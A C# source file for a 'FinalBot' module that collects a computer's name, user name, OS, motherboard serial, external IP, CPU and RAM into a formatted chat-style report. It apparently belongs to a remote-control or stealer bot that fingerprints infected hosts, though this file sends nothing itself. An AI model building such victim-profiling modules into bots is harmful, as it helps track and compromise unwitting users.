using System;
using System.IO;
using System.Management;
using System.Net;
using System.Text;

namespace FinalBot.Modules
{
    public static class SystemInfoModule
    {
        public static string GetSystemInfo()
        {
            var sb = new StringBuilder();
            sb.AppendLine("📋 *SYSTEM INFORMATION*");
            sb.AppendLine($"🏁 *PC:* {Environment.MachineName}");
            sb.AppendLine($"👤 *User:* {Environment.UserName}");
            sb.AppendLine($"🌐 *OS:* {Environment.OSVersion}");
            sb.AppendLine($"🆔 *HWID:* {GetHWID()}");
            sb.AppendLine($"📡 *IP:* {GetExternalIP()}");
            sb.AppendLine($"🔋 *CPU:* {GetCPUName()}");
            sb.AppendLine($"🧠 *RAM:* {GetTotalRAM()} GB");

            return sb.ToString();
        }

        private static string GetHWID()
        {
            try 
            {
                string m_Args = "";
                ManagementObjectSearcher m_Searcher = new ManagementObjectSearcher("SELECT SerialNumber FROM Win32_BaseBoard");
                foreach (ManagementObject m_Object in m_Searcher.Get())
                {
                    m_Args = m_Object["SerialNumber"].ToString();
                }
                return m_Args;
            }
            catch { return "Unknown"; }
        }

        private static string GetExternalIP()
        {
            try 
            {
                using (var client = new WebClient())
                {
                    return client.DownloadString("https://api.ipify.org");
                }
            }
            catch { return "Unknown"; }
        }

        private static string GetCPUName()
        {
            try 
            {
                ManagementObjectSearcher searcher = new ManagementObjectSearcher("SELECT Name FROM Win32_Processor");
                foreach (ManagementObject obj in searcher.Get())
                {
                    return obj["Name"].ToString();
                }
            }
            catch { }
            return "Unknown";
        }

        private static string GetTotalRAM()
        {
            try 
            {
                ManagementObjectSearcher searcher = new ManagementObjectSearcher("SELECT TotalPhysicalMemory FROM Win32_ComputerSystem");
                foreach (ManagementObject obj in searcher.Get())
                {
                    long bytes = Convert.ToInt64(obj["TotalPhysicalMemory"]);
                    return (bytes / 1024 / 1024 / 1024).ToString();
                }
            }
            catch { }
            return "Unknown";
        }
    }
}
